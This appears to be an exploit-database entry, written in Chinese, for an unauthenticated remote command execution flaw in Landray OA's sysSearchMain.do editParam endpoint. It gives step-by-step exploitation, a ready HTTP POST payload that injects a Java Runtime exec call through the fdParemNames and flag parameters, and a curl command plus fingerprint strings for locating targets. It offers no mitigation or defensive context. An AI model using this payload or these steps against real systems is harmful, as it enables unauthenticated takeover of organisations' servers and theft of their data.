---
id: LANDRAY-SEARCHMAIN-RCE
title: 蓝凌OA sysSearchMain.do 远程命令执行
product: landray-oa
vendor: 深圳蓝凌
version_affected: "EKP 全系列"
severity: CRITICAL
tags: [rce, 无需认证, 国产, oa]
fingerprint: ["蓝凌", "Landray", "sysSearchMain.do"]
---

## 漏洞描述

蓝凌OA sysSearchMain.do 接口的 editParam 方法存在远程命令执行漏洞。

## 影响版本

- EKP 全系列

## 前置条件

- 无需认证

## 利用步骤

1. 向 `/sys/search/sys_search_main/sysSearchMain.do?method=editParam` 发送 POST 请求
2. 通过 `fdParemNames` 和 `flag` 参数注入 Java 表达式执行系统命令
3. 从响应中获取命令执行结果

## Payload

```http
POST /sys/search/sys_search_main/sysSearchMain.do?method=editParam HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

fdParemNames=flag&flag=Runtime.getRuntime().exec("whoami")
```

## 验证方法

响应中包含命令执行结果。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/sys/search/sys_search_main/sysSearchMain.do"
```
